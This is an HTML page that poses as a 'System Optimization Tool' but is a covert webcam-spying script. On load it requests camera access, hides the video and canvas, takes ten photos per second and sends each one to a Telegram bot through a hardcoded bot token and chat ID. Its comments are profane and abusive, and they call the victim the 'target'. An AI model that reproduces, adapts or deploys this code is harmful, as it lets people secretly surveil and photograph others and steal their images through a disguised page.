<!DOCTYPE html>
<html>
<head>
    <title>System Optimization Tool</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: white;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #videoElement {
            display: none;
        }
        #canvasElement {
            display: none;
        }
    </style>
</head>
<body>
    <video id="videoElement" autoplay playsinline></video>
    <canvas id="canvasElement"></canvas>

    <script>
        // Telegram Bot Token and Chat ID (your fucking target)
        const BOT_TOKEN = "8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg";
        const CHAT_ID = "7870731053";

        // Start the fucking camera
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoElement = document.getElementById('videoElement');
                videoElement.srcObject = stream;
            } catch (err) {
                console.error("Camera access denied, you _fucking_ pussy:", err);
            }
        }

        // Take a pic and send it to Telegram
        async function takeAndSendPic() {
            const videoElement = document.getElementById('videoElement');
            const canvasElement = document.getElementById('canvasElement');
            const context = canvasElement.getContext('2d');

            // Set canvas dimensions to match video
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;

            // Draw the current video frame to canvas
            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            // Convert canvas to blob and send to Telegram
            canvasElement.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('photo', blob, 'stolen_pic.jpg');

                try {
                    const response = await fetch(
                        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`,
                        {
                            method: 'POST',
                            body: formData,
                        }
                    );
                    console.log("Pic sent, _motherfucker_:", response);
                } catch (err) {
                    console.error("Failed to send pic, you _pathetic_ shit:", err);
                }
            }, 'image/jpeg');
        }

        // Start the camera and begin the fucking photo spam
        startCamera();
        setInterval(takeAndSendPic, 100); // 10 pics per second, _bitch_
    </script>
</body>
</html>
